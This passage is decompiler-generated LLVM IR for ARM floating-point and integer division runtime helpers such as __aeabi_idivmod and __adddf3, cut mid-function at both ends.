bb113:                                            ; preds = %bb112
  %v8_14cc4 = udiv i32 %v5_14cc4, 2
  %v9_14cc4 = add i32 %v4_14cc4, %v8_14cc4
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_14ccc = phi i32 [ %v4_14cc4, %bb112 ], [ %v9_14cc4, %bb113 ]
  %v1_14cc8 = icmp slt i32 %v2_14bc4, 0
  %v6_14ccc = lshr i32 %v0_14ccc, %v1_14ccc
  %v2_14cd0 = sub i32 0, %v6_14ccc
  %v2_14cd0.v6_14ccc = select i1 %v1_14cc8, i32 %v2_14cd0, i32 %v6_14ccc
  ret i32 %v2_14cd0.v6_14ccc

dec_label_pc_14cd8:                               ; preds = %entry
  %v0_14cdc = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_14cc4, { 1, 0 }
  uselistorder i1 %v7_14cbc, { 1, 0 }
  uselistorder i32 %v4_14cb4, { 1, 0 }
  uselistorder i32 %v1_14cb4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14ca8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14ca8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14c98, { 1, 0 }
  uselistorder i32 %v0_14c5c, { 1, 0 }
  uselistorder i32 %v4_14c50, { 1, 0 }
  uselistorder i32 %v1_14c58, { 1, 2, 0 }
  uselistorder i32 %v4_14c44, { 1, 0 }
  uselistorder i32 %v1_14c4c, { 1, 2, 0 }
  uselistorder i32 %v4_14c38, { 1, 0 }
  uselistorder i32 %v1_14c40, { 1, 2, 0 }
  uselistorder i32 %v1_14c64, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14c34, { 1, 0 }
  uselistorder i32 %v1_14c60, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14c20, { 1, 0 }
  uselistorder i32 %v3_14c1c, { 1, 0 }
  uselistorder i32 %v1_14c1c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_14c18, { 1, 0 }
  uselistorder i32 %v1_14c20, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14c0c, { 1, 0 }
  uselistorder i32 %v4_14c08, { 2, 1, 0 }
  uselistorder i32 %v1_14c0c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14c14.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_14be0, { 1, 0 }
  uselistorder i32 %v1_14c98, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_14bc4, { 1, 0, 2 }
  uselistorder i32 %v0_14bc0, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_14c6c, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14c28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14c14thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14cf0 = sdiv i32 %arg1, %arg2
  ret i32 %v2_14cf0
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_14d08 = bitcast i64 %tmp to double
  %v9_14d08 = fadd double %v8_14d08, %arg1
  %v10_14d08 = fptrunc double %v9_14d08 to float
  %v11_14d08 = bitcast float %v10_14d08 to i32
  ret i32 %v11_14d08
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_14d0c = load i32, i32* @r0, align 4
  ret i32 %v2_14d0c
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14d10 = load i32, i32* @r4, align 4
  store i32 %v3_14d10, i32* %stack_var_-12, align 4
  %v6_14d10 = load i32, i32* @r5, align 4
  %v9_14d10 = load i32, i32* @lr, align 4
  %v0_14d14 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d14 = mul i32 %v0_14d14, 2
  store i32 %v2_14d14, i32* %r4.global-to-local, align 4
  %v0_14d18 = load i32, i32* %r3.global-to-local, align 4
  %v2_14d18 = mul i32 %v0_14d18, 2
  store i32 %v2_14d18, i32* %r5.global-to-local, align 4
  %v4_14d1c = icmp eq i32 %v2_14d18, %v2_14d14
  %v1_14d20 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_14d1c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_14d20 = load i32, i32* %r2.global-to-local, align 4
  %v5_14d20 = icmp eq i32 %v2_14d20, %v1_14d20
  br i1 %v5_14d20, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_14d24 = or i32 %v1_14d20, %v2_14d14
  %v5_14d24 = icmp eq i32 %v3_14d24, 0
  br i1 %v5_14d24, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_14d28 = load i32, i32* %r2.global-to-local, align 4
  %v3_14d28 = or i32 %v2_14d28, %v2_14d18
  %v5_14d28 = icmp eq i32 %v3_14d28, 0
  br i1 %v5_14d28, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_14d14.off = add i32 %v2_14d14, 4194303
  %tmp = icmp ult i32 %v2_14d14.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_14d18.off = add i32 %v2_14d18, 4194303
  %tmp17 = icmp ult i32 %v2_14d18.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_14d34 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_14d34, i32 ptrtoint (i32* @global_var_14f6c.442 to i32))
  %v0_14d38 = load i32, i32* %r4.global-to-local, align 4
  %v3_14d38 = udiv i32 %v0_14d38, 2097152
  store i32 %v3_14d38, i32* %r4.global-to-local, align 4
  %v1_14d3c = load i32, i32* %r5.global-to-local, align 4
  %v4_14d3c = udiv i32 %v1_14d3c, 2097152
  %v5_14d3c = sub nsw i32 %v4_14d3c, %v3_14d38
  %v5_14d40 = icmp ult i32 %v4_14d3c, %v3_14d38
  br i1 %v5_14d40, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_14d40 = sub nsw i32 0, %v5_14d3c
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_14d40, %bb13 ], [ %v5_14d3c, %.thread3 ]
  %v0_14d64 = phi i32 [ %v7_14d40, %bb13 ], [ %v5_14d3c, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_14d44 = icmp ugt i32 %v4_14d3c, %v3_14d38
  br i1 %v7_14d44, label %dec_label_pc_14d48, label %dec_label_pc_14d64

dec_label_pc_14d48:                               ; preds = %bb14
  %v2_14d48 = add nsw i32 %v0_14d64, %v3_14d38
  store i32 %v2_14d48, i32* %r4.global-to-local, align 4
  %v0_14d4c = load i32, i32* %r0.global-to-local, align 4
  %v1_14d4c = load i32, i32* %r2.global-to-local, align 4
  %v0_14d50 = load i32, i32* %r1.global-to-local, align 4
  %v1_14d50 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_14d4c, i32* %r0.global-to-local, align 4
  store i32 %v1_14d50, i32* %r1.global-to-local, align 4
  store i32 %v0_14d4c, i32* %r2.global-to-local, align 4
  store i32 %v0_14d50, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14d64

dec_label_pc_14d64:                               ; preds = %bb14, %dec_label_pc_14d48
  %tmp18 = icmp ugt i32 %v0_14d64, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_14d64
  %v6_14d68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_14d68, i32* %r4.global-to-local, align 4
  store i32 %v6_14d10, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_14d64, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_14d10)
  %v0_14d70 = load i32, i32* %r1.global-to-local, align 4
  %v3_14d70 = icmp sgt i32 %v0_14d70, -1
  %v4_14d7c = urem i32 %v0_14d70, 1048576
  %v5_14d7c = or i32 %v4_14d7c, 1048576
  store i32 %v5_14d7c, i32* %r1.global-to-local, align 4
  br i1 %v3_14d70, label %dec_label_pc_14d8c, label %dec_label_pc_14d84

dec_label_pc_14d84:                               ; preds = %bb16
  %v0_14d84 = load i32, i32* %r0.global-to-local, align 4
  %v1_14d84 = sub i32 0, %v0_14d84
  store i32 %v1_14d84, i32* %r0.global-to-local, align 4
  %v2_14d84 = icmp eq i32 %v0_14d84, 0
  %v2_14d88 = icmp eq i1 %v2_14d84, false
  %v5_14d88 = sext i1 %v2_14d88 to i32
  %v6_14d88 = sub nsw i32 %v5_14d88, %v5_14d7c
  store i32 %v6_14d88, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d8c

dec_label_pc_14d8c:                               ; preds = %bb16, %dec_label_pc_14d84
  %v0_14d8c = load i32, i32* %r3.global-to-local, align 4
  %v3_14d8c = icmp sgt i32 %v0_14d8c, -1
  %v4_14d94 = urem i32 %v0_14d8c, 1048576
  %v5_14d94 = or i32 %v4_14d94, 1048576
  store i32 %v5_14d94, i32* %r3.global-to-local, align 4
  br i1 %v3_14d8c, label %dec_label_pc_14da4, label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d8c
  %v0_14d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_14d9c = sub i32 0, %v0_14d9c
  store i32 %v1_14d9c, i32* %r2.global-to-local, align 4
  %v2_14d9c = icmp eq i32 %v0_14d9c, 0
  %v2_14da0 = icmp eq i1 %v2_14d9c, false
  %v5_14da0 = sext i1 %v2_14da0 to i32
  %v6_14da0 = sub nsw i32 %v5_14da0, %v5_14d94
  store i32 %v6_14da0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14da4

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d8c, %dec_label_pc_14d9c
  %v0_14da4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14da4 = load i32, i32* %r5.global-to-local, align 4
  %v4_14da4 = icmp eq i32 %v1_14da4, %v0_14da4
  call void @__pseudo_cond_branch(i1 %v4_14da4, i32 ptrtoint (i32* @global_var_14f54.443 to i32))
  %v1_14da8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14da8

; uselistorder directives
  uselistorder i32 %v0_14d8c, { 1, 0 }
  uselistorder i32 %v0_14d70, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_14d3c, { 2, 1, 0 }
  uselistorder i32 %v3_14d38, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_14d20, { 1, 0 }
  uselistorder i32 %v2_14d18, { 1, 3, 0, 2 }
  uselistorder i32 %v2_14d14, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_14da4, { 1, 0 }
  uselistorder label %dec_label_pc_14d8c, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_14d64, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14dac() local_unnamed_addr {
dec_label_pc_14dac:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_14dac = load i32, i32* @r4, align 4
  %v1_14dac = add i32 %v0_14dac, -1
  store i32 %v1_14dac, i32* @r4, align 4
  %v0_14db0 = load i32, i32* @r5, align 4
  %v1_14db0 = sub i32 32, %v0_14db0
  store i32 %v1_14db0, i32* @lr, align 4
  %v5_14db4 = icmp sgt i32 %v0_14db0, 32
  br i1 %v5_14db4, label %dec_label_pc_14dd0, label %dec_label_pc_14db8

dec_label_pc_14db8:                               ; preds = %dec_label_pc_14dac
  %v0_14db8 = load i32, i32* @r2, align 4
  %v6_14db8 = shl i32 %v0_14db8, %v1_14db0
  store i32 %v6_14db8, i32* %ip.global-to-local, align 4
  %v0_14dbc = load i32, i32* @r0, align 4
  %v3_14dbc = add i32 %v0_14db0, -1
  %v4_14dbc = shl i32 1, %v3_14dbc
  %v7_14dbc = lshr i32 %v0_14db8, %v0_14db0
  %v8_14dbc = add i32 %v0_14dbc, %v7_14dbc
  %v9_14dbc = icmp ult i32 %v8_14dbc, %v0_14dbc
  %v0_14dc0 = load i32, i32* @r1, align 4
  %v2_14dc0 = zext i1 %v9_14dbc to i32
  %v3_14dc0 = add i32 %v2_14dc0, %v0_14dc0
  %v1_14dc4 = load i32, i32* @r3, align 4
  %v7_14dc4 = shl i32 %v1_14dc4, %v1_14db0
  %v8_14dc4 = add i32 %v7_14dc4, %v8_14dbc
  store i32 %v8_14dc4, i32* %r0.global-to-local, align 4
  %v5_14dc8 = and i32 %v1_14dc4, %v4_14dbc
  %v6_14dc8 = icmp ne i32 %v5_14dc8, 0
  %v7_14dc8 = ashr i32 %v1_14dc4, %v0_14db0
  %v9_14dc8 = add i32 %v3_14dc0, %v7_14dc8
  %v10_14dc8 = zext i1 %v6_14dc8 to i32
  %v11_14dc8 = add i32 %v10_14dc8, %v9_14dc8
  br label %dec_label_pc_14dec

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14dac
  %v1_14dd0 = add i32 %v0_14db0, -32
  %v1_14dd4 = add i32 %v1_14db0, 32
  store i32 %v1_14dd4, i32* @lr, align 4
  %v0_14ddc = load i32, i32* @r3, align 4
  %v2_14ddc = add i32 %v1_14db0, 31
  %v3_14ddc = lshr i32 -2147483648, %v2_14ddc
  %v4_14ddc = and i32 %v0_14ddc, %v3_14ddc
  %v5_14ddc = icmp ne i32 %v4_14ddc, 0
  %v6_14ddc = shl i32 %v0_14ddc, %v1_14dd4
  %v2_14de0 = or i32 %v6_14ddc, 2
  %v2_14de0.v6_14ddc = select i1 %v5_14ddc, i32 %v2_14de0, i32 %v6_14ddc
  store i32 %v2_14de0.v6_14ddc, i32* %ip.global-to-local, align 4
  %v0_14de4 = load i32, i32* @r0, align 4
  %v7_14de4 = ashr i32 %v0_14ddc, %v1_14dd0
  %v8_14de4 = add i32 %v0_14de4, %v7_14de4
  store i32 %v8_14de4, i32* %r0.global-to-local, align 4
  %v0_14de8 = load i32, i32* @r1, align 4
  %v2_14de8 = and i32 %v0_14ddc, 1073741824
  %v3_14de8 = icmp ne i32 %v2_14de8, 0
  %v4_14de8 = ashr i32 %v0_14ddc, 31
  %v6_14de8 = add i32 %v0_14de8, %v4_14de8
  %v7_14de8 = zext i1 %v3_14de8 to i32
  %v8_14de8 = add i32 %v6_14de8, %v7_14de8
  br label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14db8, %dec_label_pc_14dd0
  %storemerge = phi i32 [ %v11_14dc8, %dec_label_pc_14db8 ], [ %v8_14de8, %dec_label_pc_14dd0 ]
  %v0_14dec = phi i32 [ %v11_14dc8, %dec_label_pc_14db8 ], [ %v8_14de8, %dec_label_pc_14dd0 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_14dec = and i32 %v0_14dec, -2147483648
  store i32 %v1_14dec, i32* @r5, align 4
  %v1_14df0 = icmp sgt i32 %v0_14dec, -1
  call void @__pseudo_cond_branch(i1 %v1_14df0, i32 ptrtoint (i32* @global_var_14e00.444 to i32))
  %v0_14df4 = load i32, i32* %ip.global-to-local, align 4
  %v1_14df4 = sub i32 0, %v0_14df4
  store i32 %v1_14df4, i32* %ip.global-to-local, align 4
  %v2_14df4 = icmp eq i32 %v0_14df4, 0
  %v0_14df8 = load i32, i32* %r0.global-to-local, align 4
  %v2_14df8 = icmp eq i1 %v2_14df4, false
  %v5_14df8 = sext i1 %v2_14df8 to i32
  %v6_14df8 = sub i32 %v5_14df8, %v0_14df8
  store i32 %v6_14df8, i32* %r0.global-to-local, align 4
  %v7_14df8 = zext i1 %v2_14df8 to i32
  %v8_14df8 = icmp ne i32 %v6_14df8, %v7_14df8
  %v9_14df8 = icmp ne i32 %v0_14df8, -1
  %v10_14df8 = or i1 %v9_14df8, %v8_14df8
  %v11_14df8 = icmp ne i32 %v0_14df8, 0
  %v12_14df8 = select i1 %v2_14df8, i1 %v10_14df8, i1 %v11_14df8
  %v0_14dfc = load i32, i32* %r1.global-to-local, align 4
  %v5_14dfc = sext i1 %v12_14df8 to i32
  %v6_14dfc = sub i32 %v5_14dfc, %v0_14dfc
  store i32 %v6_14dfc, i32* @r1, align 4
  ret i32 %v6_14df8

; uselistorder directives
  uselistorder i1 %v2_14df8, { 1, 2, 0 }
  uselistorder i32 %v0_14df8, { 1, 2, 0 }
  uselistorder i32 %v8_14de8, { 1, 0 }
  uselistorder i32 %v0_14ddc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_14dc8, { 1, 0 }
  uselistorder i32 %v1_14dc4, { 1, 0, 2 }
  uselistorder i32 %v0_14dbc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_14dec, { 1, 0 }
}

define i32 @function_14e00(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14e00:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14e00 = load i32, i32* %r1.global-to-local, align 4
  %v3_14e04 = icmp ult i32 %v0_14e00, 1048574
  br i1 %v3_14e04, label %dec_label_pc_14e48, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14e00
  %v3_14e0c = icmp ult i32 %v0_14e00, 2097150
  br i1 %v3_14e0c, label %dec_label_pc_14e2c, label %dec_label_pc_14e10

dec_label_pc_14e10:                               ; preds = %dec_label_pc_14e08
  %v1_14e10 = urem i32 %v0_14e00, 2
  %v2_14e10 = icmp ne i32 %v1_14e10, 0
  %v3_14e10 = udiv i32 %v0_14e00, 2
  store i32 %v3_14e10, i32* %r1.global-to-local, align 4
  %v0_14e14 = load i32, i32* %r0.global-to-local, align 4
  %v3_14e14 = zext i1 %v2_14e10 to i32
  %v6_14e14 = zext i32 %v0_14e14 to i64
  %v7_14e14 = sub i32 33, %v0_14e14
  %v8_14e14 = zext i32 %v7_14e14 to i64
  %v9_14e14 = shl i64 %v6_14e14, %v8_14e14
  %v10_14e14 = sub i32 32, %v0_14e14
  %v11_14e14 = shl i32 %v3_14e14, %v10_14e14
  %v12_14e14 = zext i32 %v11_14e14 to i64
  %v14_14e14 = or i64 %v12_14e14, %v9_14e14
  %v15_14e14 = trunc i64 %v14_14e14 to i32
  %v16_14e14 = add i32 %v0_14e14, -1
  %v17_14e14 = shl i32 1, %v16_14e14
  %v18_14e14 = and i32 %v17_14e14, %v0_14e14
  %v19_14e14 = icmp ne i32 %v18_14e14, 0
  store i32 %v15_14e14, i32* %r0.global-to-local, align 4
  %v0_14e18 = load i32, i32* @ip, align 4
  %v3_14e18 = zext i1 %v19_14e14 to i32
  %v6_14e18 = zext i32 %v0_14e18 to i64
  %v7_14e18 = sub i32 33, %v0_14e18
  %v8_14e18 = zext i32 %v7_14e18 to i64
  %v9_14e18 = shl i64 %v6_14e18, %v8_14e18
  %v10_14e18 = sub i32 32, %v0_14e18
  %v11_14e18 = shl i32 %v3_14e18, %v10_14e18
  %v12_14e18 = zext i32 %v11_14e18 to i64
  %v14_14e18 = or i64 %v12_14e18, %v9_14e18
  %v15_14e18 = trunc i64 %v14_14e18 to i32
  store i32 %v15_14e18, i32* @ip, align 4
  %v0_14e1c = load i32, i32* @r4, align 4
  %v1_14e1c = add i32 %v0_14e1c, 1
  store i32 %v1_14e1c, i32* @r4, align 4
  %v3_14e20 = mul i32 %v1_14e1c, 2097152
  %v2_14e24 = icmp ugt i32 %v3_14e20, -4194305
  call void @__pseudo_cond_branch(i1 %v2_14e24, i32 ptrtoint (i32* @global_var_14fdc.445 to i32))
  br label %dec_label_pc_14e2c

dec_label_pc_14e2c:                               ; preds = %dec_label_pc_14e48, %dec_label_pc_14e08, %dec_label_pc_14e10
  %v0_14e2c = load i32, i32* @ip, align 4
  %v2_14e2c = icmp slt i32 %v0_14e2c, 0
  %v6_14e2c = icmp eq i32 %v0_14e2c, -2147483648
  %v1_14e30 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_14e2c, label %bb, label %dec_label_pc_14e2c._crit_edge

bb:                                               ; preds = %dec_label_pc_14e2c
  %v2_14e30 = urem i32 %v1_14e30, 2
  %v3_14e30 = icmp ne i32 %v2_14e30, 0
  br label %dec_label_pc_14e2c._crit_edge

dec_label_pc_14e2c._crit_edge:                    ; preds = %dec_label_pc_14e2c, %bb
  %v1_14e34 = phi i1 [ %v3_14e30, %bb ], [ %v2_14e2c, %dec_label_pc_14e2c ]
  %v2_14e34 = zext i1 %v1_14e34 to i32
  %v3_14e34 = add i32 %v2_14e34, %v1_14e30
  store i32 %v3_14e34, i32* %r0.global-to-local, align 4
  %v0_14e38 = load i32, i32* %r1.global-to-local, align 4
  %v1_14e38 = load i32, i32* @r4, align 4
  %v2_14e38 = and i32 %v1_14e38, 4096
  %v3_14e38 = icmp ne i32 %v2_14e38, 0
  %v4_14e38 = mul i32 %v1_14e38, 1048576
  %v6_14e38 = add i32 %v4_14e38, %v0_14e38
  %v7_14e38 = zext i1 %v3_14e38 to i32
  %v8_14e38 = add i32 %v7_14e38, %v6_14e38
  %v1_14e3c = load i32, i32* @r5, align 4
  %v2_14e3c = or i32 %v1_14e3c, %v8_14e38
  store i32 %v2_14e3c, i32* %r1.global-to-local, align 4
  ret i32 %v3_14e34

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e00
  %v0_14e48 = load i32, i32* @ip, align 4
  %v1_14e48 = icmp slt i32 %v0_14e48, 0
  %v2_14e48 = mul i32 %v0_14e48, 2
  store i32 %v2_14e48, i32* @ip, align 4
  %v0_14e4c = load i32, i32* %r0.global-to-local, align 4
  %v3_14e4c = mul i32 %v0_14e4c, 2
  %v4_14e4c = zext i1 %v1_14e48 to i32
  %v5_14e4c = or i32 %v3_14e4c, %v4_14e4c
  store i32 %v5_14e4c, i32* %r0.global-to-local, align 4
  %v9_14e4c = icmp ule i32 %v5_14e4c, %v0_14e4c
  %v10_14e4c = icmp ult i32 %v3_14e4c, %v0_14e4c
  %v11_14e4c = select i1 %v1_14e48, i1 %v9_14e4c, i1 %v10_14e4c
  %v3_14e50 = mul i32 %v0_14e00, 2
  %v4_14e50 = zext i1 %v11_14e4c to i32
  %v5_14e50 = or i32 %v4_14e50, %v3_14e50
  store i32 %v5_14e50, i32* %r1.global-to-local, align 4
  %v1_14e54 = and i32 %v3_14e50, 1048576
  %v2_14e54 = icmp eq i32 %v1_14e54, 0
  %v0_14e58 = load i32, i32* @r4, align 4
  %v1_14e58 = add i32 %v0_14e58, -1
  store i32 %v1_14e58, i32* @r4, align 4
  br i1 %v2_14e54, label %bb7, label %dec_label_pc_14e2c

bb7:                                              ; preds = %dec_label_pc_14e48
  ret i32 %v5_14e4c

; uselistorder directives
  uselistorder i32 %v0_14e4c, { 1, 2, 0 }
  uselistorder i1 %v1_14e48, { 1, 0 }
  uselistorder i32 %v1_14e30, { 1, 0 }
  uselistorder i32 %v0_14e2c, { 1, 0 }
  uselistorder i32 %v0_14e18, { 1, 0, 2 }
  uselistorder i32 %v0_14e14, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_14e2c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14e2c, { 0, 2, 1 }
}

define i32 @function_14e60() local_unnamed_addr {
dec_label_pc_14e60:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_14e60 = load i32, i32* @r1, align 4
  %v2_14e60 = icmp eq i32 %v0_14e60, 0
  br i1 %v2_14e60, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_14e60
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_14e60
  %v1_14e6c10 = load i32, i32* @r0, align 4
  store i32 %v1_14e6c10, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_14ec8 = phi i32 [ %v0_14e60, %bb ], [ %v1_14e6c10, %bb38 ]
  %v1_14e80 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_14e78 = icmp ugt i32 %v0_14ec8, 65535
  br i1 %v2_14e78, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_14e7c = and i32 %v0_14ec8, 32768
  %v3_14e7c = icmp eq i32 %v2_14e7c, 0
  %v4_14e7c = udiv i32 %v0_14ec8, 65536
  br i1 %v3_14e7c, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_14e80 = add nsw i32 %v1_14e80, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_14e8c = phi i32 [ %v1_14e80, %.thread ], [ %v1_14e80, %bb39 ], [ %v2_14e80, %bb40 ]
  %v1_14e88 = phi i32 [ %v0_14ec8, %.thread ], [ %v4_14e7c, %bb39 ], [ %v4_14e7c, %bb40 ]
  %v2_14e84 = icmp ugt i32 %v1_14e88, 255
  br i1 %v2_14e84, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_14e88 = and i32 %v1_14e88, 128
  %v3_14e88 = icmp eq i32 %v2_14e88, 0
  %v4_14e88 = udiv i32 %v1_14e88, 256
  br i1 %v3_14e88, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_14e8c = add nsw i32 %v1_14e8c, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_14e98 = phi i32 [ %v1_14e8c, %.thread3 ], [ %v1_14e8c, %bb41 ], [ %v2_14e8c, %bb42 ]
  %v1_14e94 = phi i32 [ %v1_14e88, %.thread3 ], [ %v4_14e88, %bb41 ], [ %v4_14e88, %bb42 ]
  %v2_14e90 = icmp ugt i32 %v1_14e94, 15
  br i1 %v2_14e90, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_14e94 = and i32 %v1_14e94, 8
  %v3_14e94 = icmp eq i32 %v2_14e94, 0
  %v4_14e94 = udiv i32 %v1_14e94, 16
  br i1 %v3_14e94, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_14e98 = add nsw i32 %v1_14e98, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_14ea0 = phi i32 [ %v1_14e98, %.thread4 ], [ %v1_14e98, %bb43 ], [ %v2_14e98, %bb44 ]
  %v1_14ea8 = phi i32 [ %v1_14e94, %.thread4 ], [ %v4_14e94, %bb43 ], [ %v4_14e94, %bb44 ]
  %v2_14e9c = icmp ugt i32 %v1_14ea8, 3
  br i1 %v2_14e9c, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_14ea0 = add i32 %v1_14ea0, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_14ea4 = udiv i32 %v1_14ea8, 2
